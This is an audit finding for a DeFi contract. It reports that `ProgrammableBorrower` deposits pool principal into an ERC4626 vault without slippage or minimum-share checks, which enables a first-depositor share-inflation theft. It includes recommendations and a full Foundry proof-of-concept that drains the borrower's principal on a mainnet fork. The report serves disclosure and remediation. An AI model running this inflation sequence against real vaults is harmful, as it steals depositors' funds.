### Title
Unprotected ERC4626 deposit permits first-depositor theft of programmable-borrower principal - ([File: `contracts/strategies/idle/ProgrammableBorrower.sol`])

### Summary
`ProgrammableBorrower` deposits all idle underlying into the configured ERC4626 vault without a minimum-share or slippage bound. If the vault has zero or sufficiently low share supply, an unprivileged vault user can perform a share-price inflation attack before the epoch-start deposit, causing the programmable borrower to receive zero or disproportionately few shares and then redeem the pool principal.

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` transfers surplus underlying to the configured programmable borrower and invokes `onStartEpoch`. [1](#0-0)  `ProgrammableBorrower.onStartEpoch` then deposits its full underlying balance through `_depositToVault`. [2](#0-1)  `_depositToVault` accepts whatever share amount `vault.deposit` returns and performs no `minShares`, expected-assets, or vault-liquidity validation. [3](#0-2) 

For an empty balance-tracking ERC4626 vault, an attacker can deposit `1` asset to receive `1` share and then donate `P` assets directly to the vault. When the borrower deposits another `P` assets, integer share conversion returns `floor(P / (P + 1)) = 0` shares. The attacker’s sole share can then redeem approximately `2P + 1` assets, stealing the programmable borrower’s `P` principal.

### Impact Explanation
The attacker can directly steal pool principal in the buffer/start phase of the first epoch, or immediately after an honest migration to an empty or thinly supplied vault. Because the CDO’s active NAV is represented by strategy tokens rather than continuously by the borrower’s current external-vault assets, the theft can leave tranches temporarily backed by phantom NAV. [4](#0-3)  When the borrower must fund pending withdrawals, the missing assets make the borrower pull fail and force the pool into default. [5](#0-4)  The resulting loss is quantified as the deposited principal `P`, less only the attacker’s negligible seed deposit.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have zero or economically negligible share supply when `ProgrammableBorrower` next deposits. That state can occur at initial programmable-borrower deployment or after a legitimate `setVault` migration, while `initialize` and `setVault` check only the vault address and matching asset, not minimum liquidity or inflation resistance. [6](#0-5) [7](#0-6)  Existing mature vaults make the attack economically impractical, but nothing prevents the vulnerable configuration.

### Recommendation
Require a protected deposit path before trusting an ERC4626 vault:

- Enforce a minimum returned share amount or minimum post-deposit `convertToAssets` value in `_depositToVault`.
- Reject vaults below a configured minimum asset/supply threshold in `initialize` and `setVault`.
- Prefer vaults with virtual-share inflation protection, or have the borrower first mint an internal dead-share reserve.
- After deposit, compare realized shares/assets with the deposited principal and revert if the loss exceeds a bounded rounding tolerance.

### Proof of Concept
The following Foundry test reproduces the share-inflation sequence on a mainnet fork using the production `ProgrammableBorrower` entry point and a standard balance-tracking ERC4626 implementation:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflationVault is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(IERC20Detailed asset_) ERC20("Inflation Vault", "IV") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0
            ? shares
            : shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 assetsBefore = assetToken.balanceOf(address(this));
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        shares = assets * supply / assetToken.balanceOf(address(this));
        if (shares * assetToken.balanceOf(address(this)) < assets * supply) {
            shares += 1;
        }
        if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function maxWithdraw(address owner) external view returns (uint256) {
        return convertToAssets(balanceOf(owner));
    }

    function convertToShares(uint256 assets) external view returns (uint256) {
        uint256 supply = totalSupply();
        uint256 managed = assetToken.balanceOf(address(this));
        return supply == 0 || managed == 0 ? assets : assets * supply / managed;
    }
}

contract MockCDO {
    address public token;
    constructor(address token_) { token = token_; }
}

contract ProgrammableBorrowerFirstDepositPoC is Test {
    IERC20Detailed constant USDC =
        IERC20Detailed(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testFirstDepositorStealsEpochPrincipal() external {
        vm.createSelectFork("mainnet");

        address attacker = makeAddr("attacker");
        address owner = makeAddr("owner");
        address manager = makeAddr("manager");
        address realBorrower = makeAddr("realBorrower");

        InflationVault vault = new InflationVault(USDC);
        MockCDO cdo = new MockCDO(address(USDC));

        ProgrammableBorrower borrower = new ProgrammableBorrower();
        borrower.initialize(
            address(vault),
            address(cdo),
            owner,
            manager,
            realBorrower,
            0
        );

        uint256 principal = 1_000_000e6;

        // Attacker seeds one share and inflates the vault to principal + 1.
        deal(address(USDC), attacker, principal + 1);
        vm.startPrank(attacker);
        USDC.approve(address(vault), 1);
        vault.deposit(1, attacker);
        USDC.transfer(address(vault), principal);
        vm.stopPrank();

        // IdleCDO's startEpoch flow has transferred the pool balance to the borrower.
        deal(address(USDC), address(borrower), principal);

        vm.prank(address(cdo));
        borrower.onStartEpoch(0);

        // floor(principal / (principal + 1)) == 0 shares for the borrower.
        assertEq(vault.balanceOf(address(borrower)), 0);

        uint256 before = USDC.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(
            USDC.balanceOf(attacker) - before,
            (2 * principal) + 1
        );
        assertEq(vault.convertToAssets(vault.balanceOf(address(borrower))), 0);
    }
}
```
